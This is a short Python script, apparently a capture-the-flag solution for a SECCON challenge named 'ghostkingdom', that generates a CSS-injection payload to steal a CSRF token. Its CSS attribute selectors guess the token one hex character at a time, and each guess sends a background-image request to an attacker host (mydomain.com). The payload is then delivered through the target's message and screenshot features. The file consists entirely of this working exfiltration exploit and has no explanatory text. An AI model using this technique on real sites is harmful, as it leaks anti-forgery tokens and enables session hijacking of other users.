import sys
from base64 import b64encode
from urllib import quote as urlencode

if len(sys.argv)>1:
  inicio = sys.argv[1]
else:
  inicio = ''

element = 'input[name="csrf"]'
exfilturl = 'http://mydomain.com'
chars = '0123456789abcdef'

payload = ''
for c in chars:
  value = inicio + c
  payload += '%s[value^="%s"]{background:url("%s/%s");}\n' % (element, value, exfilturl, value+'_')

send_msg_url = 'http://l.mydomain.com/?css=' + urlencode(b64encode(payload)) + '%2&msg=test&action=msgadm2'
screenshot_exfil_url = 'http://ghostkingdom.pwn.seccon.jp/?url=' + urlencode(send_msg_url) + '&action=sshot2'
print(screenshot_exfil_url)
